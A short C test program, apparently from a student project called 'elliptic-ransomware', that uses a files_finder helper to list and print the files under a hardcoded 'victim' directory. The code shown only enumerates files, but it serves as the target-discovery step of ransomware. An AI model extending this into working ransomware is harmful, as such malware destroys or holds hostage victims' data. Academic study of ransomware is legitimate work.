#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>

#include "files_finder.h"

int main(int argc, char const *argv[])
{
    char* paths[] = {"/home/jb/Documents/N7/3A/uqac/ete/crypto/elliptic-ransomware/victim"};
    listFileData* p_listFileData = init_list_file_data();
    files_finder(p_listFileData, paths, 1);
    print_path_data(p_listFileData);
    free_path_data(p_listFileData);
    return 0;
}
